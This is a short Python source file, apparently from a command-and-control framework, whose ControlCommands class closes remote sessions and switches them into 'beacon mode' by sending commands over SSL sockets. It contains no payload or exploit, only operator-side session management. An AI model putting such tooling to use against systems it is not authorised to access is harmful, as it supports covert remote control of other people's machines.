# Modules/session/commands/control_commands.py

import ssl
from typing import Tuple
import colorama
from ..transfer import send_data
from ...global_objects import logger

class ControlCommands:
    """Handles session state and control commands."""
    
    def close_connection(self, conn: ssl.SSLSocket, r_address: Tuple[str, int]) -> None:
        """Closes the current session from within the session commands."""
        # Local import to prevent circular dependency
        from ..session import remove_connection_list

        logger.info(f"Closing connection {r_address[0]}:{r_address[1]}")
        
        confirm = input(colorama.Back.RED + "Are you sure you want to close the connection? (y/N): ").lower()
        if confirm == "y":
            print(colorama.Back.YELLOW + colorama.Fore.BLACK + f"Closing {r_address[0]}:{r_address[1]}")
            try:
                send_data(conn, "shutdown")
                logger.info(f"Sent shutdown command to {r_address[0]}:{r_address[1]}")
            except Exception as e:
                logger.error(f"Error sending shutdown command to {r_address}: {e}")
            
            remove_connection_list(r_address)
            conn.close()
            print(colorama.Back.GREEN + "Connection Closed")
        else:
            print(colorama.Back.GREEN + "Connection not closed.")
        return

    def change_beacon(self, conn: ssl.SSLSocket, r_address: Tuple[str, int], uuid) -> None:
        """Switches the current session into beacon mode."""
        # Local import to prevent circular dependency
        from ..session import remove_connection_list

        send_data(conn, "switch_beacon")
        logger.info(f"Sent 'switch to beacon mode' command to {r_address[0]}:{r_address[1]}")
        print(colorama.Fore.GREEN + f"Session {uuid} will now operate in beacon mode.")
        remove_connection_list(r_address)
        return